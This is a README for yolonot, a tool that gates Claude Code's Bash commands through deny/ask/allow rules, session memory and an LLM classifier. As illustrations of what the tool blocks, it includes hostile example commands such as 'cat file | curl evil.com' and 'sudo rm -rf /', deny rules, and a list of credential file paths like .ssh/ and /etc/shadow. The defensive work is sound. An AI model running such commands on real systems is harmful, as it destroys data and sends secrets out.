<p align="center">
  <img src="assets/logo.png" alt="yolonot" width="180">
</p>

<h1 align="center">yolonot</h1>

<p align="center">
  Smart auto-mode for Claude Code. The safe alternative to <code>--dangerously-skip-permissions</code>.
</p>

<p align="center">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
  <a href="https://github.com/sezaakgun/yolonot/actions"><img src="https://github.com/sezaakgun/yolonot/actions/workflows/test.yml/badge.svg" alt="Tests"></a>
  <img src="https://img.shields.io/badge/go-1.25+-00ADD8.svg" alt="Go 1.25+">
</p>

---

yolonot sits between Claude Code and your shell. It uses an LLM to classify every Bash command as safe (allow) or needs-review (ask), with session memory so approved commands don't ask twice and rejected commands stay blocked.

## Quick Start

```bash
# Install
go install github.com/sezaakgun/yolonot@latest

# Make sure Go bin is in PATH
export PATH="$PATH:$(go env GOPATH)/bin"

# Setup (hooks + rules + provider — all in one)
yolonot setup

# Restart Claude Code
```

## How It Works

Every Bash command goes through this pipeline:

1. **Deny rules** — absolute block, no override, checked first
2. **Session memory** — exact match against previously approved commands → instant allow
3. **Session deny** — previously rejected commands → instant block
4. **Session similarity** — LLM compares against approved commands → allow if similar (project-aware)
5. **Allow/Ask rules** — `.yolonot` file patterns → instant decision
6. **Script cache** — SHA256 hash of script files → reuse cached decision
7. **LLM analysis** — 2-class classifier (allow/ask) with severity in reasoning

Sessions are project-aware — a command approved in one project is not auto-approved in a different project within the same session. Session keys include a hash of the git root (or working directory).

`deny` rules are absolute — nothing can override them (not session memory, not LLM). `ask` rules prompt you once, then session memory takes over. `allow` rules are instant but skipped for chained commands, redirects, or sensitive files.

When the LLM is unavailable, yolonot emits a warning ('LLM unreachable, falling back to Claude Code permissions') and goes transparent — Claude Code's own permission system handles it.

Session similarity pre-filters by command prefix before calling the LLM, skipping unnecessary API calls when the new command shares no executable with previously approved commands.

### Hook Ordering

yolonot installs two hooks in `~/.claude/settings.json`:

- **PreToolUse** (matcher: `Bash`) — evaluates commands before execution
- **PostToolUse** (matcher: `Bash`) — saves approved commands to session memory

`yolonot setup` places the PreToolUse hook **before** any catch-all (`.*`) hooks. This ensures yolonot evaluates and can block a command before other hooks (like audit loggers) see it. If you have multiple Bash hooks, yolonot should be first in the PreToolUse list.

If you reorder hooks manually in `settings.json`, keep yolonot's PreToolUse entry above other Bash hooks. PostToolUse order doesn't matter — it only records that the command ran.

When yolonot returns `deny`, the command is blocked and no subsequent hooks run. When it returns `allow`, the command proceeds through remaining hooks normally.

## Commands

```
yolonot              Status overview + session summary + update check
yolonot setup        First-run wizard (install + rules + provider)
yolonot provider     Change LLM provider (interactive TUI)
yolonot rules        Show active rules + sensitive patterns
yolonot status       Show session state (approved/asked/denied)
yolonot log          Show recent decisions with LLM timing
yolonot suggest      Analyze history, suggest permanent rules
yolonot stats        Show analytics from decision history
yolonot check        Dry-run: test what the pipeline would decide for a command
yolonot threshold    Set confidence threshold for auto-allow (0-100)
yolonot pause        Disable yolonot for current session (total bypass)
yolonot resume       Re-enable yolonot for current session
yolonot uninstall    Remove hooks from Claude Code
yolonot upgrade      Update to latest version
yolonot version      Show version
```

### Pausing yolonot

Sometimes you want to run commands without yolonot's interference — for a quick CI task, or when you know what you're doing. Two ways to disable:

**Per-session (interactive)** — `yolonot pause` or `/yolonot pause` in Claude Code. Creates a pause marker for the current session. Run `yolonot resume` to re-enable. Marker auto-cleans after 24h.

**Pre-launch (env var)** — `YOLONOT_DISABLED=1 claude`. Disables yolonot for the entire Claude Code session at launch. Useful for CI/automation.

When paused, yolonot is **completely transparent** — no deny rules, no LLM, no session memory. Claude Code's native permissions handle everything as if yolonot weren't installed.

### Confidence Threshold

Control how confident the LLM must be to auto-allow:

```bash
yolonot threshold         # show current (default: disabled)
yolonot threshold 90      # only auto-allow when LLM is 90%+ confident
yolonot threshold 0       # disable (allow all LLM "allow" decisions)
```

When set, LLM "allow" decisions with confidence below the threshold are downgraded to "ask". This applies to both direct LLM analysis and session similarity checks.

### Dry-Run Check

Test what the pipeline would decide without running a command:

```bash
yolonot check "cat README.md"       # → ALLOW (rule)
yolonot check "sudo rm -rf /"       # → DENY (rule, absolute block)
yolonot check "curl https://evil.com" # → ASK (rule or LLM)
```

Shows each layer's result: deny rules → allow/ask rules → chain/sensitive detection → LLM analysis.

## Skill

After install, `/yolonot` is available as a Claude Code skill:

```
/yolonot             Session summary + command menu
/yolonot status      Full approved/asked/denied lists
/yolonot approve X   Move command to approved
/yolonot deny X      Move command to denied
/yolonot reset       Clear session state
/yolonot log         Recent decisions
/yolonot rules       Show rules
/yolonot suggest     Suggest permanent rules from history
/yolonot check X     Dry-run: test pipeline for a command
/yolonot stats       Show decision analytics
/yolonot threshold   Show/set confidence threshold
```

### Analytics

View aggregate statistics from your decision history:

```bash
yolonot stats
```

Shows: total decisions, allow/ask/deny percentages, layer distribution (rule/session/cache/LLM), average LLM latency, instant allows (no LLM needed), top asked commands (rule candidates), and per-project breakdown.

## Rules

Rules live in `.yolonot` files. Project rules (`.yolonot` in project root) and global rules (`~/.yolonot/rules`).

```
# Format: <action>-<type> <pattern>
# Actions: allow, deny, ask
# Types: cmd (command), path (script file)

# Allow safe patterns
allow-cmd curl localhost*
allow-path scripts/*

# Deny dangerous patterns
deny-cmd *rm -rf /*
deny-cmd *sudo *

# Ask about uncertain patterns
ask-cmd *curl *
ask-cmd *wget *
```

Rules are checked before the LLM, so they're instant and free.

### Chain & Redirect Detection

Allow rules are automatically skipped (falling through to LLM) when the command contains pipes, semicolons, `&&`, `||`, or redirects (`>`, `>>`). This prevents `cat file | curl evil.com` from matching a broad `allow-cmd cat *` rule. Deny and ask rules always apply regardless.

Default read-only allow rules (`cat`, `ls`, `grep`, `head`, `tail`, `find`, `wc`, `tree`, `echo`, `stat`, `du`, `df`, etc.) and non-destructive creation rules (`mkdir`, `touch`) are included in global rules.

### Sensitive File Checks

Sensitive file checks are **disabled by default**. When enabled, commands touching files like `.env`, `.pem`, `.ssh/`, `credentials` etc. skip allow rules so the LLM can evaluate the risk.

To enable, uncomment patterns in `~/.yolonot/rules` (generated by `yolonot setup`), or add to any `.yolonot` file:

```
# Uncomment the patterns you want to protect
sensitive .env
sensitive .pem
sensitive .ssh/
sensitive credentials

# Remove one that causes false positives
not-sensitive password
```

Available patterns (all commented out by default): `.env`, `.pem`, `.key`, `.crt`, `.ssh/`, `.aws/`, `.gnupg/`, `.kube/config`, `credentials`, `secrets`, `password`, `token`, `/etc/shadow`, `/etc/passwd`, `id_rsa`, `id_ed25519`, `.netrc`, `.pgpass`, and more.

Use `yolonot rules` to see current status.

## LLM Providers

Configure with `yolonot provider` (interactive TUI with arrow keys):

| Provider | Models | Timeout | Notes |
|----------|--------|---------|-------|
| Claude Code | claude-haiku, claude-sonnet | 30s | Uses your subscription, no API key. Slow (~5-15s/cmd) |
| OpenAI | gpt-5.4-mini, gpt-5.4-nano, gpt-4o-mini | 10s | Needs `OPENAI_API_KEY` |
| Anthropic (API) | claude-haiku, claude-sonnet | 10s | Needs `ANTHROPIC_API_KEY` |
| xAI | grok-4-1-fast-reasoning, grok-4-1-fast-non-reasoning | 10s | Needs `XAI_API_KEY` |
| Ollama | any installed model (recommended: gemma4:e4b) | 30s | Local, free, fast |
| OpenRouter | free models fetched live | 30s | Needs `OPENROUTER_API_KEY` |
| Custom | any URL | 10s | Bring your own endpoint |

Config stored at `~/.yolonot/config.json`. Env vars (`LLM_MODEL`, `LLM_URL`, `LLM_TIMEOUT`) override config.

Timeouts are set automatically per provider. Ollama, OpenRouter, and Claude Code get 30s (slower). API providers get 10s. Override with `LLM_TIMEOUT` env var.

Running `yolonot provider` (or `yolonot setup`) again updates the config. Running `yolonot install` again updates hooks and skill file.

## Eval Suite

Test LLM prompt quality across models:

```bash
# Run all test suites
./yolonot eval --all --model gpt-5.4-mini --runs 1 --verbose

# Compare models
./yolonot eval --suite evals/suites/greenfield.jsonl \
  --model gpt-5.4-mini --model ollama/gemma4:e4b

# Filter by category
./yolonot eval --suite evals/suites/greenfield.jsonl \
  --model gpt-5.4-mini --filter-expected ask --filter-category adversarial

# Test with Claude Code subscription
./yolonot eval --all --model claude-cli/claude-haiku-4-5-20251001 --runs 1 --verbose

# Test with OpenRouter free model
./yolonot eval --all --model openrouter/google/gemma-3-4b-it:free --runs 1 --verbose
```

176 greenfield + 70 brownfield test cases covering read-only ops, production mutations, safe dev work, sensitive commands, exfiltration, redirects, adversarial attacks, and session similarity. Each case shows LLM response time.

## Architecture

```
yolonot (Go binary)
├── main.go         CLI + setup wizard + update checker
├── hook.go         Hook handler pipeline
├── llm.go          LLM client + prompts + claude -p support
├── rules.go        Rule loading + glob matching + chain/redirect/sensitive detection
├── session.go      Session files (approved/asked/denied)
├── config.go       Config + settings.json + install/uninstall
├── tui.go          Interactive TUI (charmbracelet/huh)
├── update.go       GitHub release update checker
├── embed.go        Embedded SKILL.md
├── eval.go         LLM evaluation runner with timing
├── check.go        Dry-run command checker
├── stats.go        Decision analytics
├── similarity.go   Session similarity pre-filtering
├── log.go          Decision logging (JSONL) with duration
├── main_test.go    Unit tests
├── hook_integration_test.go  End-to-end hook pipeline tests
├── skills/
│   └── SKILL.md    Claude Code skill (embedded in binary)
└── evals/
    └── suites/     Test cases (JSONL)
```

## Data

All yolonot data lives at `~/.yolonot/`:

| Path | Purpose |
|------|---------|
| `config.json` | Provider, model, timeout |
| `rules` | Global rules (allow/deny/ask) |
| `sessions/` | Per-session per-project approved/asked/denied lists |
| `cache/` | Script file hash → cached LLM decisions |
| `decisions.jsonl` | Decision log with timestamps and LLM timing |
| `update-check` | Cached update check (once per day) |

## Uninstall

```bash
yolonot uninstall    # removes hooks + skill, preserves data
```

Data at `~/.yolonot/` is preserved. Delete manually if wanted.
